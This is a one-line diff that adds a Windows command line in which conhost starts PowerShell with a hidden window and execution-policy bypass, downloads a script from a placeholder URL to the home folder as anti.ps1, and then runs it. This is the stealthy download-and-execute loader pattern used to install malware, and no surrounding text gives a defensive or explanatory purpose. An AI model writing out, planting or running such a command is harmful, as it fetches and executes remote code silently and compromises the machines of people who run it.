@@ -1,0 +1,1 @@
+conhost powershell -w h -ep bypass wget >>URL<< -o ~/anti.ps1; ~/anti.ps1;
